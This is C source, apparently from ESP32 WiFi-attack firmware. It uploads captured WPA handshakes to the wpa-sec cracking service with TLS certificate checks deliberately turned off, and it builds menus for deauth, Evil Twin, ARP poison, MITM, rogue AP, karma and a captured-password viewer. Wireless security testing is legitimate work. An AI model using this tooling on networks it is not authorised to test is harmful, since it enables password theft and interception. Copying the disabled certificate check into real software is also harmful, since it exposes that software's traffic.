    if (sd_cache != NULL && sd_cache->loaded && sd_cache->wpasec_key[0] != '\0') {
        strncpy(wpasec_api_key, sd_cache->wpasec_key, WPASEC_KEY_MAX_LEN - 1);
        wpasec_api_key[WPASEC_KEY_MAX_LEN - 1] = '\0';
    }

    return wpasec_api_key[0] != '\0';
}

/**
 * @brief Write all data to esp_tls, handling partial writes
 */
static int wpasec_tls_write_all(esp_tls_t *tls, const char *buf, int len)
{
    int written = 0;
    while (written < len) {
        int ret = esp_tls_conn_write(tls, buf + written, len - written);
        if (ret < 0) {
            return ret;
        }
        written += ret;
    }
    return written;
}

/**
 * @brief Upload a single .pcap file to wpa-sec.stanev.org
 *
 * Uses esp_tls directly for full control over TLS settings,
 * specifically to skip server certificate verification.
 *
 * @param filepath  Full path to .pcap file on SD card
 * @param filename  Just the filename (for the Content-Disposition header)
 * @return 0 on success, 1 on duplicate ("already submitted"), -1 on error
 */
static int wpasec_upload_file(const char *filepath, const char *filename)
{
    // Read file into memory (acquire SD mutex)
    FILE *f = NULL;
    long file_size = 0;
    uint8_t *file_buf = NULL;

    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
        f = fopen(filepath, "rb");
        if (!f) {
            ESP_LOGW(TAG, "WPA-SEC: Failed to open: %s", filepath);
            xSemaphoreGive(sd_spi_mutex);
            return -1;
        }

        fseek(f, 0, SEEK_END);
        file_size = ftell(f);
        fseek(f, 0, SEEK_SET);

        if (file_size <= 0 || file_size > 512 * 1024) {
            ESP_LOGW(TAG, "WPA-SEC: Invalid file size: %ld bytes", file_size);
            fclose(f);
            xSemaphoreGive(sd_spi_mutex);
            return -1;
        }

        // Prefer PSRAM for file buffer
        if (heap_caps_get_free_size(MALLOC_CAP_SPIRAM) > (size_t)file_size + 1024) {
            file_buf = (uint8_t *)heap_caps_malloc((size_t)file_size, MALLOC_CAP_SPIRAM);
        }
        if (!file_buf) {
            file_buf = (uint8_t *)malloc((size_t)file_size);
        }
        if (!file_buf) {
            ESP_LOGW(TAG, "WPA-SEC: Memory allocation failed (%ld bytes)", file_size);
            fclose(f);
            xSemaphoreGive(sd_spi_mutex);
            return -1;
        }

        size_t bytes_read = fread(file_buf, 1, (size_t)file_size, f);
        fclose(f);
        xSemaphoreGive(sd_spi_mutex);

        if (bytes_read != (size_t)file_size) {
            ESP_LOGW(TAG, "WPA-SEC: Read error: got %zu of %ld bytes", bytes_read, file_size);
            free(file_buf);
            return -1;
        }
    } else {
        ESP_LOGW(TAG, "WPA-SEC: Could not take SD mutex");
        return -1;
    }

    // Build multipart body parts
    char boundary[32];
    snprintf(boundary, sizeof(boundary), "----WpaSec%lu", (unsigned long)(esp_timer_get_time() / 1000));

    char body_start[256];
    int start_len = snprintf(body_start, sizeof(body_start),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, filename);

    char body_end[48];
    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);

    int body_total_len = start_len + (int)file_size + end_len;

    // Build HTTP request headers
    char http_headers[512];
    int hdr_len = snprintf(http_headers, sizeof(http_headers),
        "POST / HTTP/1.1\r\n"
        "Host: wpa-sec.stanev.org\r\n"
        "Cookie: key=%s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "User-Agent: pancake-wpasec\r\n"
        "Connection: close\r\n"
        "\r\n",
        wpasec_api_key, boundary, body_total_len);

    // Open TLS connection - skip server cert verification
    esp_tls_cfg_t tls_cfg = {
        .crt_bundle_attach = NULL,
        .timeout_ms = 15000,
    };

    esp_tls_t *tls = esp_tls_init();
    if (!tls) {
        ESP_LOGW(TAG, "WPA-SEC: TLS init failed");
        free(file_buf);
        return -1;
    }

    int ret = esp_tls_conn_http_new_sync(WPASEC_URL, &tls_cfg, tls);
    if (ret < 0) {
        ESP_LOGW(TAG, "WPA-SEC: TLS connection failed");
        esp_tls_conn_destroy(tls);
        free(file_buf);
        return -1;
    }

    // Send HTTP headers
    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0) {
        ESP_LOGW(TAG, "WPA-SEC: Failed to send HTTP headers");
        esp_tls_conn_destroy(tls);
        free(file_buf);
        return -1;
    }

    // Send multipart body: start boundary + file data + end boundary
    int write_ok = 1;
    if (wpasec_tls_write_all(tls, body_start, start_len) < 0) write_ok = 0;
    if (write_ok && wpasec_tls_write_all(tls, (const char *)file_buf, (int)file_size) < 0) write_ok = 0;
    if (write_ok && wpasec_tls_write_all(tls, body_end, end_len) < 0) write_ok = 0;
    free(file_buf);

    if (!write_ok) {
        ESP_LOGW(TAG, "WPA-SEC: Failed to send body");
        esp_tls_conn_destroy(tls);
        return -1;
    }

    // Read response
    char resp_buf[512] = {0};
    int total_read = 0;
    while (total_read < (int)sizeof(resp_buf) - 1) {
        ret = esp_tls_conn_read(tls, resp_buf + total_read, sizeof(resp_buf) - 1 - total_read);
        if (ret <= 0) break;
        total_read += ret;
    }
    resp_buf[total_read] = '\0';

    esp_tls_conn_destroy(tls);

    // Parse HTTP status code from response
    int status = 0;
    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
        const char *sp = strchr(resp_buf, ' ');
        if (sp) status = atoi(sp + 1);
    }

    if (status == 200) {
        if (strstr(resp_buf, "already submitted") != NULL) {
            return 1; // duplicate
        }
        return 0; // success
    } else {
        ESP_LOGW(TAG, "WPA-SEC: HTTP error %d", status);
        return -1;
    }
}

/**
 * @brief Background FreeRTOS task that uploads all handshakes
 * Pushes UI messages to wpasec_ui_queue for the LVGL timer to display.
 */
static void wpasec_upload_task(void *pvParameters)
{
    (void)pvParameters;

    wpasec_ui_msg_t ui_msg;

    // Open handshakes directory (need SD mutex)
    DIR *dir = NULL;
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
        dir = opendir("/sdcard/lab/handshakes");
        xSemaphoreGive(sd_spi_mutex);
    }

    if (dir == NULL) {
        snprintf(ui_msg.text, sizeof(ui_msg.text), "Failed to open handshakes directory");
        ui_msg.color = lv_color_make(244, 67, 54); // red
        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
        wpasec_upload_done = true;
        wpasec_upload_active = false;
        wpasec_upload_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    // Count .pcap files first
    struct dirent *entry;
    int total_files = 0;

    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) continue;
            size_t nlen = strlen(entry->d_name);
            if (nlen > 5 && strcasecmp(entry->d_name + nlen - 5, ".pcap") == 0) {
                total_files++;
            }
        }
        rewinddir(dir);
        xSemaphoreGive(sd_spi_mutex);
    }

    if (total_files == 0) {
        snprintf(ui_msg.text, sizeof(ui_msg.text), "No .pcap files found");
        ui_msg.color = lv_color_make(255, 152, 0); // orange
        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
            closedir(dir);
            xSemaphoreGive(sd_spi_mutex);
        }
        wpasec_upload_done = true;
        wpasec_upload_active = false;
        wpasec_upload_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    snprintf(ui_msg.text, sizeof(ui_msg.text), "Uploading %d handshake(s)...", total_files);
    ui_msg.color = lv_color_make(0, 188, 212); // cyan
    if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));

    int current = 0;
    int uploaded = 0;
    int duplicates = 0;
    int failed = 0;

    // Iterate through directory entries
    while (wpasec_upload_active) {
        char d_name[256];
        bool got_entry = false;

        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
            entry = readdir(dir);
            if (entry != NULL) {
                strncpy(d_name, entry->d_name, sizeof(d_name) - 1);
                d_name[sizeof(d_name) - 1] = '\0';
                got_entry = true;
            }
            xSemaphoreGive(sd_spi_mutex);
        }

        if (!got_entry) break;

        // Filter: skip dirs and non-.pcap files
        size_t nlen = strlen(d_name);
        if (nlen <= 5 || strcasecmp(d_name + nlen - 5, ".pcap") != 0) continue;

        current++;
        char filepath[280];
        snprintf(filepath, sizeof(filepath), "/sdcard/lab/handshakes/%s", d_name);

        // Get file size for display
        struct stat st;
        long fsize = 0;
        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
            if (stat(filepath, &st) == 0) {
                fsize = (long)st.st_size;
            }
            xSemaphoreGive(sd_spi_mutex);
        }

        // Send "uploading" message — truncate filename for display
        char short_name[128];
        strncpy(short_name, d_name, sizeof(short_name) - 1);
        short_name[sizeof(short_name) - 1] = '\0';

        snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s (%ld B)...", current, total_files, short_name, fsize);
        ui_msg.color = lv_color_make(0, 188, 212); // cyan
        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));

        int result = wpasec_upload_file(filepath, d_name);

        if (result == 0) {
            snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s -> OK", current, total_files, short_name);
            ui_msg.color = lv_color_make(76, 175, 80); // green
            uploaded++;
        } else if (result == 1) {
            snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s -> dup", current, total_files, short_name);
            ui_msg.color = lv_color_make(255, 193, 7); // amber
            duplicates++;
        } else {
            snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s -> FAIL", current, total_files, short_name);
            ui_msg.color = lv_color_make(244, 67, 54); // red
            failed++;
        }
        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));

        // Small delay between uploads
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    // Close directory
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
        closedir(dir);
        xSemaphoreGive(sd_spi_mutex);
    }

    // Summary
    snprintf(ui_msg.text, sizeof(ui_msg.text), "Done: %d uploaded, %d dup, %d failed", uploaded, duplicates, failed);
    ui_msg.color = (failed > 0) ? lv_color_make(244, 67, 54) : lv_color_make(76, 175, 80);
    if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));

    wpasec_upload_done = true;
    wpasec_upload_active = false;
    wpasec_upload_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief LVGL timer callback - drains wpasec_ui_queue and updates the status list.
 * Runs every 200ms in the LVGL thread context.
 */
static void wpasec_upload_timer_cb(lv_timer_t *timer)
{
    (void)timer;

    if (!wpasec_ui_queue) return;

    wpasec_ui_msg_t ui_msg;
    while (xQueueReceive(wpasec_ui_queue, &ui_msg, 0) == pdTRUE) {
        if (wpasec_status_list && lv_obj_is_valid(wpasec_status_list)) {
            lv_obj_t *item = lv_list_add_text(wpasec_status_list, ui_msg.text);
            if (item) {
                lv_obj_set_style_text_color(item, ui_msg.color, 0);
                lv_obj_set_style_bg_color(item, ui_bg_color(), 0);
                lv_obj_set_style_bg_opa(item, LV_OPA_COVER, 0);
                lv_obj_set_style_text_font(item, &lv_font_montserrat_12, 0);
                lv_obj_set_style_pad_ver(item, 2, 0);
            }
            lv_obj_scroll_to_y(wpasec_status_list, LV_COORD_MAX, LV_ANIM_ON);
        }

        // Also update progress label with the last message
        if (wpasec_progress_label && lv_obj_is_valid(wpasec_progress_label)) {
            lv_label_set_text(wpasec_progress_label, ui_msg.text);
        }
    }

    // When done, delete the timer
    if (wpasec_upload_done) {
        lv_timer_del(wpasec_upload_timer);
        wpasec_upload_timer = NULL;
    }
}

/**
 * @brief Show the WPA-SEC Upload page.
 * Reads API key from SD, checks handshake count, starts background upload task.
 */
static void show_wpa_sec_upload_page(void)
{
    create_function_page_base("WPA-SEC Upload");

    // 1. Read API key from SD card
    if (!wpasec_read_key_from_sd()) {
        // Show error popup
        lv_obj_t *overlay = lv_obj_create(function_page);
        lv_obj_set_size(overlay, lv_pct(90), 120);
        lv_obj_center(overlay);
        lv_obj_set_style_bg_color(overlay, ui_panel_color(), 0);
        lv_obj_set_style_border_color(overlay, lv_color_make(244, 67, 54), 0);
        lv_obj_set_style_border_width(overlay, 2, 0);
        lv_obj_set_style_radius(overlay, 10, 0);
        lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t *err = lv_label_create(overlay);
        lv_label_set_text(err, "API key not found!\n\nPlace your key in:\n/sdcard/lab/wpa-sec.txt");
        lv_obj_set_style_text_color(err, lv_color_make(244, 67, 54), 0);
        lv_obj_set_style_text_font(err, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_align(err, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_center(err);
        return;
    }

    // 2. Check handshake count
    int hs_count = sd_cache_get_handshake_count();
    if (hs_count == 0) {
        lv_obj_t *overlay = lv_obj_create(function_page);
        lv_obj_set_size(overlay, lv_pct(90), 100);
        lv_obj_center(overlay);
        lv_obj_set_style_bg_color(overlay, ui_panel_color(), 0);
        lv_obj_set_style_border_color(overlay, lv_color_make(255, 152, 0), 0);
        lv_obj_set_style_border_width(overlay, 2, 0);
        lv_obj_set_style_radius(overlay, 10, 0);
        lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t *msg = lv_label_create(overlay);
        lv_label_set_text(msg, "No handshakes to upload.\n\nCapture some handshakes first!");
        lv_obj_set_style_text_color(msg, lv_color_make(255, 152, 0), 0);
        lv_obj_set_style_text_font(msg, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_center(msg);
        return;
    }

    // 3. Build upload UI
    // Title
    lv_obj_t *title = lv_label_create(function_page);
    lv_label_set_text(title, "WPA-SEC Upload");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, lv_color_make(0, 188, 212), 0);
    lv_obj_set_style_text_align(title, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 35);

    // Info line: key + count
    char info_buf[80];
    snprintf(info_buf, sizeof(info_buf), "Key: %.4s****  |  %d handshake(s)", wpasec_api_key, hs_count);
    lv_obj_t *info = lv_label_create(function_page);
    lv_label_set_text(info, info_buf);
    lv_obj_set_style_text_color(info, lv_color_make(176, 176, 176), 0);
    lv_obj_set_style_text_font(info, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_align(info, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 60);

    // Progress label (current file being uploaded)
    wpasec_progress_label = lv_label_create(function_page);
    lv_label_set_text(wpasec_progress_label, "Starting upload...");
    lv_label_set_long_mode(wpasec_progress_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
    lv_obj_set_width(wpasec_progress_label, lv_pct(96));
    lv_obj_set_style_text_color(wpasec_progress_label, lv_color_make(0, 188, 212), 0);
    lv_obj_set_style_text_font(wpasec_progress_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_align(wpasec_progress_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_align(wpasec_progress_label, LV_ALIGN_TOP_MID, 0, 76);

    // Status list (terminal-style: black bg, cyan border)
    wpasec_status_list = lv_list_create(function_page);
    lv_obj_set_size(wpasec_status_list, lv_pct(96), LCD_V_RES - 30 - 100);
    lv_obj_align(wpasec_status_list, LV_ALIGN_TOP_MID, 0, 92);
    lv_obj_set_style_bg_color(wpasec_status_list, ui_bg_color(), 0);
    lv_obj_set_style_border_color(wpasec_status_list, lv_color_make(0, 188, 212), 0);
    lv_obj_set_style_border_width(wpasec_status_list, 1, 0);
    lv_obj_set_style_pad_all(wpasec_status_list, 4, 0);
    lv_obj_set_style_text_color(wpasec_status_list, lv_color_make(0, 188, 212), 0);

    // 4. Create message queue and start upload
    if (wpasec_ui_queue) {
        vQueueDelete(wpasec_ui_queue);
    }
    wpasec_ui_queue = xQueueCreate(16, sizeof(wpasec_ui_msg_t));

    wpasec_upload_done = false;
    wpasec_upload_active = true;

    // Create LVGL timer for UI updates (200ms)
    wpasec_upload_timer = lv_timer_create(wpasec_upload_timer_cb, 200, NULL);

    // Start background upload task (8KB stack in PSRAM)
    StackType_t *task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (task_stack) {
        static StaticTask_t task_buf;
        wpasec_upload_task_handle = xTaskCreateStatic(
            wpasec_upload_task, "wpasec_up", 8192, NULL, 5,
            task_stack, &task_buf);
        if (!wpasec_upload_task_handle) {
            ESP_LOGE(TAG, "WPA-SEC: Failed to create upload task");
            heap_caps_free(task_stack);
            wpasec_upload_active = false;
            wpasec_upload_done = true;
        }
    } else {
        ESP_LOGE(TAG, "WPA-SEC: Failed to allocate task stack");
        wpasec_upload_active = false;
        wpasec_upload_done = true;
    }
}

// Attack tiles screen - shown after selecting networks
static void show_attack_tiles_screen(void)
{
    create_function_page_base("Select Attack");
    
    // Create small tiles container (4+5 layout) with compact spacing
    lv_obj_t *attack_tiles = lv_obj_create(function_page);
    lv_obj_set_size(attack_tiles, lv_pct(100), 170);
    lv_obj_align(attack_tiles, LV_ALIGN_TOP_MID, 0, 35);
    lv_obj_set_style_bg_color(attack_tiles, ui_bg_color(), 0);
    lv_obj_set_style_border_width(attack_tiles, 0, 0);
    lv_obj_set_style_pad_all(attack_tiles, 5, 0);
    lv_obj_set_style_pad_gap(attack_tiles, 5, 0);
    lv_obj_set_flex_flow(attack_tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(attack_tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(attack_tiles, LV_OBJ_FLAG_SCROLLABLE);
    
    // Row 1: Deauth, Evil Twin, SAE, Handshake
    create_small_tile(attack_tiles, LV_SYMBOL_CHARGE, "Deauth", COLOR_MATERIAL_RED, attack_tile_event_cb, "Deauth");
    create_small_tile(attack_tiles, LV_SYMBOL_WARNING, "Evil Twin", COLOR_MATERIAL_ORANGE, attack_tile_event_cb, "Evil Twin");
    create_small_tile(attack_tiles, LV_SYMBOL_POWER, "SAE", COLOR_MATERIAL_PINK, attack_tile_event_cb, "SAE Overflow");
    create_small_tile(attack_tiles, LV_SYMBOL_DOWNLOAD, "Handshake", COLOR_MATERIAL_AMBER, attack_tile_event_cb, "Handshaker");
    // Row 2: ARP Poison, MITM, Rogue AP, WPA-SEC Upload, Observer
    create_small_tile(attack_tiles, LV_SYMBOL_SHUFFLE, "ARP Poison", COLOR_MATERIAL_TEAL, attack_tile_event_cb, "ARP Poison");
    create_small_tile(attack_tiles, LV_SYMBOL_LOOP, "MITM", lv_color_make(121, 85, 72), attack_tile_event_cb, "MITM");
    create_small_tile(attack_tiles, LV_SYMBOL_WIFI, "Rogue AP", COLOR_MATERIAL_INDIGO, attack_tile_event_cb, "Rogue AP");
    create_small_tile(attack_tiles, LV_SYMBOL_UPLOAD, "WPA-SEC", COLOR_MATERIAL_CYAN, attack_tile_event_cb, "WPA-SEC Upload");
    create_small_tile(attack_tiles, LV_SYMBOL_EYE_OPEN, "Observer", COLOR_MATERIAL_PURPLE, attack_tile_event_cb, "Sniffer");
    
    // Horizontal separator line above Selected Networks
    lv_obj_t *separator = lv_obj_create(function_page);
    lv_obj_set_size(separator, lv_pct(90), 2);
    lv_obj_align(separator, LV_ALIGN_TOP_MID, 0, 213);
    lv_obj_set_style_bg_color(separator, ui_accent_color(), 0);
    lv_obj_set_style_bg_opa(separator, LV_OPA_50, 0);
    lv_obj_set_style_border_width(separator, 0, 0);
    lv_obj_set_style_radius(separator, 1, 0);
    
    // Selected networks header
    lv_obj_t *header_label = lv_label_create(function_page);
    lv_label_set_text(header_label, "Selected Networks:");
    lv_obj_set_style_text_font(header_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(header_label, ui_text_color(), 0);
    lv_obj_align(header_label, LV_ALIGN_TOP_LEFT, 10, 220);
    
    // Selected networks list
    lv_obj_t *network_list = lv_obj_create(function_page);
    lv_obj_set_size(network_list, lv_pct(100), LCD_V_RES - 240);  // Bottom 80px
    lv_obj_align(network_list, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(network_list, ui_bg_color(), 0);
    lv_obj_set_style_border_width(network_list, 0, 0);
    lv_obj_set_style_pad_all(network_list, 6, 0);
    lv_obj_set_flex_flow(network_list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_gap(network_list, 4, 0);
    lv_obj_add_flag(network_list, LV_OBJ_FLAG_SCROLLABLE);
    
    // Get selected networks and display them
    int selected_indices[SCAN_RESULTS_MAX_DISPLAY];
    int selected_count = wifi_scanner_get_selected(selected_indices, SCAN_RESULTS_MAX_DISPLAY);
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t total_count = count_ptr ? *count_ptr : 0;
    
    if (selected_count <= 0 || !records || total_count == 0) {
        lv_obj_t *no_sel_label = lv_label_create(network_list);
        lv_label_set_text(no_sel_label, "No networks selected");
        lv_obj_set_style_text_color(no_sel_label, ui_text_color(), 0);
        lv_obj_set_style_text_font(no_sel_label, &lv_font_montserrat_14, 0);
    } else {
        for (int i = 0; i < selected_count; i++) {
            int idx = selected_indices[i];
            if (idx < 0 || idx >= (int)total_count) continue;
            
            const wifi_ap_record_t *ap = &records[idx];
            char line[64];
            const char *band = (ap->primary <= 14) ? "2.4" : "5";
            
            if (ap->ssid[0] != 0) {
                snprintf(line, sizeof(line), "%s (%s)", (const char *)ap->ssid, band);
            } else {
                snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
                         ap->bssid[0], ap->bssid[1], ap->bssid[2],
                         ap->bssid[3], ap->bssid[4], ap->bssid[5], band);
            }
            
            lv_obj_t *net_label = lv_label_create(network_list);
            lv_label_set_text(net_label, line);
            lv_obj_set_style_text_color(net_label, ui_text_color(), 0);
            lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
        }
    }
}

// Global WiFi Attacks screen
static void show_global_attacks_screen(void)
{
    create_function_page_base("Global WiFi Attacks");
    
    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles, ui_bg_color(), 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
    
    // Blackout tile - Red (dangerous)
    lv_obj_t *blackout_tile = create_tile(tiles, LV_SYMBOL_POWER, "Blackout", COLOR_MATERIAL_RED, NULL, NULL);
    lv_obj_add_event_cb(blackout_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Blackout");
    
    // Handshaker tile - Amber
    lv_obj_t *handshaker_tile = create_tile(tiles, LV_SYMBOL_DOWNLOAD, "Handshaker", COLOR_MATERIAL_AMBER, NULL, NULL);
    lv_obj_add_event_cb(handshaker_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Handshakes");
    
    // Portal tile - Orange
    lv_obj_t *portal_tile = create_tile(tiles, LV_SYMBOL_WIFI, "Portal", COLOR_MATERIAL_ORANGE, NULL, NULL);
    lv_obj_add_event_cb(portal_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Portal");
    
    // Snifferdog tile - Purple
    lv_obj_t *snifferdog_tile = create_tile(tiles, LV_SYMBOL_EYE_OPEN, "Sniffer dog", COLOR_MATERIAL_PURPLE, NULL, NULL);
    lv_obj_add_event_cb(snifferdog_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Snifferdog");
    
    // Wardrive tile - Teal
    lv_obj_t *wardrive_tile = create_tile(tiles, MY_SYMBOL_CAR, "Wardrive", COLOR_MATERIAL_RED, NULL, NULL);
    lv_obj_add_event_cb(wardrive_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Start Wardrive");
}

// WiFi menu screen — sub-menu grouping all WiFi functions
static void show_wifi_menu_screen(void)
{
    create_function_page_base("WiFi");
    apply_menu_bg();

    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *scan_tile = create_tile(tiles, LV_SYMBOL_WIFI,       "Scan &\nAttack",   UI_ACCENT_BLUE,   main_tile_event_cb, "WiFi Scan & Attack");
    (void)scan_tile;
    lv_obj_t *atk_tile  = create_tile(tiles, LV_SYMBOL_WARNING,    "WiFi\nAttacks",    UI_ACCENT_RED,    main_tile_event_cb, "Global WiFi Attacks");
    (void)atk_tile;
    lv_obj_t *dm_tile   = create_tile(tiles, MY_SYMBOL_SATELLITE,  "Deauth\nMon.",     UI_ACCENT_AMBER,  main_tile_event_cb, "Deauth Monitor");
    (void)dm_tile;
    lv_obj_t *obs_tile  = create_tile(tiles, LV_SYMBOL_EYE_OPEN,   "WiFi\nObserver",   UI_ACCENT_PURPLE, main_tile_event_cb, "WiFi Sniff&Karma");
    (void)obs_tile;
}

// WiFi Sniff & Karma screen
static void show_sniff_karma_screen(void)
{
    create_function_page_base("WiFi Observer");
    apply_menu_bg();

    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
    
    // Network Observer tile - Purple
    lv_obj_t *sniffer_tile = create_tile(tiles, LV_SYMBOL_EYE_OPEN, "WiFi\nObserver", COLOR_MATERIAL_PURPLE, NULL, NULL);
    lv_obj_add_event_cb(sniffer_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Sniffer");
    
    // Browse Clients tile - Indigo (REMOVED - integrated into Sniffer)
    // lv_obj_t *clients_tile = create_tile(tiles, LV_SYMBOL_LIST, "Browse\nClients", COLOR_MATERIAL_INDIGO, NULL, NULL);
    // lv_obj_add_event_cb(clients_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Browse Clients");
    
    // Show Probes tile - Teal (REMOVED - integrated into Sniffer)
    // lv_obj_t *probes_tile = create_tile(tiles, LV_SYMBOL_CALL, "Show\nProbes", COLOR_MATERIAL_TEAL, NULL, NULL);
    // lv_obj_add_event_cb(probes_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Show Probes");
    
    // Karma tile - Pink
    lv_obj_t *karma_tile = create_tile(tiles, LV_SYMBOL_SHUFFLE, "Karma", COLOR_MATERIAL_PINK, NULL, NULL);
    lv_obj_add_event_cb(karma_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Karma");
}

// WiFi Monitor tile callback
static void wifi_monitor_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    if (!tile_name) return;
    
    if (strcmp(tile_name, "Evil Twin Passwords") == 0) {
        show_eviltwin_passwords_screen();
    } else if (strcmp(tile_name, "Portal Data") == 0) {
        show_portal_data_screen();
    } else if (strcmp(tile_name, "Handshakes") == 0) {
        show_handshakes_list_screen();
    }
}

// Evil Twin Passwords screen - uses cached data from PSRAM
static void show_eviltwin_passwords_screen(void)
{
    create_function_page_base("Evil Twin Passwords");
    
    // Scrollable list container
    lv_obj_t *list = lv_obj_create(function_page);
    lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(list, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(list, ui_bg_color(), 0);
    lv_obj_set_style_border_width(list, 0, 0);
